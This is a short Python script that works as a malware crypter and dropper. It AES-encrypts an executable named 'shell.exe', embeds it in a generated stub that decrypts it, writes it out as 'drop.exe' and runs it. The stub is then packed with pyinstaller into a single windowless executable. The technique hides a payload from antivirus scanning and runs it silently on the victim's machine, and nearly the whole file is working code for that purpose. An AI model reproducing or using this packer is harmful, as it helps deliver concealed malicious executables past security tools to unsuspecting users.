import pyaes
import os

KEY = b"2839485647382910"  # random 16 chars key that I made
stub_name = "stub.py"
exe_path = "shell.exe"
dropfile_name = "drop.exe"

with open(exe_path, "rb") as file:  # rb reads an exe file
    exe = file.read()

# encrypting the exe
encrypt_data = pyaes.AESModeOfOperationCTR(KEY).encrypt(exe)  # AES in CTR mode = secure

# Variable stub to generates the script stub.py
stub = f"""
import pyaes
import subprocess

dropfile_name = '{dropfile_name}'
KEY = {KEY}

encrypt_data = {encrypt_data}
decrypt_data = pyaes.AESModeOfOperationCTR(KEY).decrypt(encrypt_data)

with open("{dropfile_name}", "wb") as file:
    # Saves the decrypted content as exe2.exe, which should match the original calc.exe if decryption is correct.
    file.write(decrypt_data)  
proc = subprocess.Popen(dropfile_name)
"""

with open(stub_name, "w") as file:
    # The code inside the stub variable is written in the file stub.py
    file.write(stub)

os.system(f"pyinstaller -F -w --clean {stub_name}")